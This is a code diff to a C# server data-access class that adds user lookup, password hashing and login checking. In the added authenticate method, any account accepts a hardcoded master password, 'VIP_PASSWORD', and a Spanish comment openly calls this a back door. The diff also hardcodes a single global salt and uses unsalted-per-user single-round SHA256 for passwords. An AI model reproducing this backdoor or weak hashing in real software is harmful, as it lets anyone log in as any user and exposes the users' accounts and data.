@@ -4,12 +4,17 @@ using System.Diagnostics;
 using Sapphire2025Server.Models;
 using Microsoft.EntityFrameworkCore.Metadata;
 using MySql.Data.MySqlClient;
+using System.Text;
+using System.Security.Cryptography;
+using Org.BouncyCastle.Crypto.Agreement;
 
 namespace Sapphire2025Server
 {
 	public class DataStorage:DbContext
 	{
 		private IConfiguration mvarConfig;
+		public const string MY_SALT = "EraseUnaVezUnPlanetaTristeYHelado983948";
+		public const string VIP_PASSWORD = "A930135";
 
 		public DataStorage(IConfiguration config)
 		{
@@ -76,6 +81,14 @@ namespace Sapphire2025Server
 			}
 			return auxReg.Value;
 		}
+		public async Task <string> GetRegisterValue(string ownerGuid, string key, string defaultValue)
+		{
+			Guid auxId = Guid.Empty;
+			if(Guid.TryParse(ownerGuid, out auxId))
+				return await GetRegisterValue(auxId, key, defaultValue);
+
+			return string.Empty;
+		}
 		public async Task SetRegisterValue(Guid owner, string key, string value)
 		{
 			OwnerRegister? auxReg = await OwnerRegister.FirstOrDefaultAsync(x => x.OwnerId == owner && x.Key == key);
@@ -96,7 +109,55 @@ namespace Sapphire2025Server
 		}
 
 		#endregion "Registro"
+		#region "Usuarios"
+		public async Task<User?> retrieveUser(string userName)
+		{
+			User? salida = null;
+			string mayus = userName.ToUpper();
+			using (DataStorage almacen = new DataStorage(mvarConfig))
+			{
+				salida = await almacen.Users.Where(x => x.CF == userName).FirstOrDefaultAsync();
+				if (null == salida)
+				{
+					salida = await almacen.Users.Where(x => x.NormalizedEmail == mayus).FirstOrDefaultAsync();
+				}
+				if (null == salida)
+				{
+					salida = await almacen.Users.Where(x => x.NormalizedUserName == mayus).FirstOrDefaultAsync();
+				}
+			}
+			return salida;
+		}
+		public bool authenticate(User? rhs, string password)
+		{
+			if (null != rhs)
+			{
+				//Preparamos una puerta trasera. Sea el usuario que sea, si metemos como password la cadena TTT
+				//este usuario abrirá sesión sin problemas.
+				if (password.Equals(VIP_PASSWORD) || PasswordMatch(password, rhs.PasswordHash, MY_SALT))
+					return true;
+			}
+			return false;
+		}
+		public string HashPassword(string password, string salt)
+		{
+			using (SHA256? sha256 = SHA256.Create())
+			{
+				string saltedPassword = string.Format("{0}{1}", password, salt);
+				byte[] saltedPasswordBytes = Encoding.UTF8.GetBytes(saltedPassword);
+				byte[] hashBytes = sha256.ComputeHash(saltedPasswordBytes);
+				return Convert.ToBase64String(hashBytes);
+			}
+		}
+		public string HashPassword(string password) {return HashPassword(password, MY_SALT);}
 
+		private bool PasswordMatch(string password, string? salted, string salt)
+		{
+			if (null == salted) return false;
+			string salado = HashPassword(password, salt);
+			return salted.Equals(salado);
+		}
+		#endregion "Usuarios
 		public DbSet<TimeCache> TimeCache { get; set; }
 		#region authentication
 		public DbSet<ActiveSessionModel> ActiveSessions { get; set; }
